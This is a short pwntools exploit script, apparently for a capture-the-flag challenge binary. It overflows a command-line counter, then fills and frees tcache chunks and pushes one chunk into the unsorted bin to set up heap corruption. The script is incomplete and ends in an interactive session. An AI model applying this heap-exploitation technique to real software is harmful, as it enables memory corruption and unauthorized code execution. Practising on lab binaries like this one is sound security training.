#!/usr/bin/env python3

from pwn import ELF, process, remote, gdb, context

#context.terminal = ["tmux", "splitw", "-h"]

bin = ELF("./chall/app")

p = process("./chall/app")
pid = gdb.attach(p, gdbscript="""
b * eton + 895
""")
#p = remote("localhost", 1337)

def malloc(p, idx, data):
    p.sendline(b"note add " + idx + data)

def free(p, idx):
    p.sendline(b"note remove " + idx)

# overflow the offset counter
payload_1 = b"touch "
payload_1 += 128 * b"A"
p.sendline(payload_1)

# heap stuff
# tcachebins
malloc(p, b"0", b" " + 130 * b"A")
malloc(p, b"1", b" " + 130 * b"A")
malloc(p, b"2", b" " + 130 * b"A")
malloc(p, b"3", b" " + 130 * b"A")
malloc(p, b"4", b" " + 130 * b"A")
malloc(p, b"5", b" " + 130 * b"A")
malloc(p, b"6", b" " + 130 * b"A")

malloc(p, b"7", b" " + 130 * b"B")

free(p, b"0")
free(p, b"1")
free(p, b"2")
free(p, b"3")
free(p, b"4")
free(p, b"5")
free(p, b"6")

free(p, b"7")  # goes to unsorted

malloc(p, b"0", b"\x00")


#malloc(p)
#malloc(p)
#malloc(p)

p.interactive()